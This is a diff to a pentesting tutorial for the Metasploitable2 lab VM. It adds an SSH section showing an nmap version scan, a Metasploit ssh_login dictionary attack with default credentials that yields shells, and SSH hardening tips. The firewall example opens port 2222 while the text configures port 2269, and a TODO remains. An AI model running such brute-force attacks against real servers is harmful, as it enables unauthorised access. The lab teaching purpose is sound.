@@ -312,7 +312,7 @@ FTP is a standard network protocol used to transfer files between a client and a
 Let's start by identifying the version of the FTP deamon using nmap:
 
 ```bash
-nmap -sV -p 192.168.1.41
+nmap -sV -p 21 192.168.1.41
 ```
 
 Here, the `-p 21` flag tells nmap to scan only for port 21. Below is my output:
@@ -386,6 +386,138 @@ For servers, use LTS versions of distributions to ensure the packages you instal
 If you want to learn how to do this manually, [this article](https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/) should help. It also goes in depth about why and how this exploit works.
 
 [Click here](https://github.com/nikdubois/vsftpd-2.3.4-infected) to browse the source code of vsFTPd 2.3.4.
+
+## SSH (port `22`)
+
+SSH is a network protocol used for secure remote communication with devices. It allows users to access and manage systems remotely. It allows users to access and manage systems remotely while encrypting data transfers. It also offers multiple authentication options to enhance security.
+
+Let's start by identifying the version of the SSH server using nmap:
+
+```bash
+nmap -sV -p 22 192.168.1.41
+```
+
+Below is my output:
+
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-16 12:37 EDT
+Nmap scan report for 192.168.1.41
+Host is up (0.0029s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
+```
+
+As you can see, metasploitable2 uses `OpenSSH`, which is the most common and widely used implementation of the SSH protocol.
+
+I couldn't find any useful exploits or vulnerabilities for `OpenSSH 4.7p1` after searching online. So, let's search for SSH related modules in metasploit:
+
+```bash
+search ssh
+```
+
+There are over a hundred results. It's always a good idea to start with the simplest approach. So let's use the `auxiliary/scanner/ssh/ssh_login` module. This module will help us perform a dictionary attack.
+
+```bash
+use auxiliary/scanner/ssh/ssh_login
+```
+
+I’ll first list the options required before running the module:
+
+```
+options
+```
+
+![alt text](image-9.png)
+
+There are many options, but let's focus on the main ones:
+
+- `THREADS`: Defines the number of threads to use for multi-threading. Defaults to 1 (single-threaded).
+- `RHOSTS`: The target IP address.
+
+You should also specify a username list and/or a password list for this module. You can set their paths using `USER_FILE` and `PASS_FILE`, or use `USERPASS_FILE`. However, for this task, we likely won’t need a large wordlist.
+
+If you are using `USER_FILE` and `PASS_FILE`, every user in the `USER_FILE` will be tested against every password in the `PASS_FILE`.
+
+If you were to ever use `USERPASS_FILE`, the format should be as such:
+
+```
+username password
+```
+
+Below are the contents of my `USERPASS_FILE`. It's not a huge list, but I couldn't find anything better online:
+
+```
+msfadmin msfadmin
+root root
+root toor
+user user
+```
+
+Now, I'll set the `RHOSTS`, specify the `USERPASS_FILE`, and run the module:
+
+```bash
+set RHOSTS 192.168.1.41
+```
+
+```bash
+set USERPASS_FILE /home/kali/Desktop/work/lis.txt
+```
+
+In the above command, I've provided the absolute path to `lis.txt`
+
+```bash
+run
+```
+
+![alt text](image-10.png)
+
+As you can see, two of the credentials worked and I got two shells.
+
+Now, let's see how you can protect your servers against attacks for SSH.
+
+By default SSH runs on port 22. Since SSH is widely used this is the convention now. This makes us suseptible for automated scans, that could then result in similiar bruteforce attacks. Changing it to a non standard port (an unprivileaged port (>1000) might be better) will save us from a lot of automated scanners. To do this, edit the `/etc/ssh/sshd_config` configuration file.
+
+```bash
+sudo nano /etc/ssh/sshd_config
+```
+
+Scroll down to find a line like:
+
+```bash
+#Port 22
+```
+
+Then, uncomment this and set it to a port like:
+
+```bash
+Port 2269
+```
+
+For the changes to take effect, you should restard the SSH deamon:
+
+:::danger NOTE
+
+If you are using a firewall, make sure you allow access to this ports before restarting `sshd`. To do this, you can run the commands below:
+
+```bash
+sudo ufw allow 2222/tcp
+sudo ufw reload
+```
+
+:::
+
+```
+sudo systemctl restart sshd
+```
+
+This won't keep us safe from someone manually scanning all the exposed ports of the server using a tool like `nmap`.
+
+TODO: link to PK blog post, disable password log in, fail2ban, disable root login (final)
 
 ## Telnet (port `23`)
 
